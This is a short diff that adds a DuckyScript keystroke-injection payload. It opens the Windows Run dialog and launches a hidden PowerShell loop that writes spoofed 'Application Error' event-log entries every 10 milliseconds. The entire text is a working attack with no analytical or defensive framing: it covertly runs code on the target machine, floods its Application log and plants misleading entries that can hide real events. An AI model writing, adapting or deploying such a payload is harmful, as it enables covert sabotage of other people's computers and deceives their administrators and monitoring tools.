@@ -1,0 +1,4 @@
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -WindowStyle Hidden -Command "while ($true) { Write-EventLog -LogName Application -Source 'Application Error' -EventId 1001 -EntryType Information -Message 'System Overload'; Start-Sleep -Milliseconds 10 }"
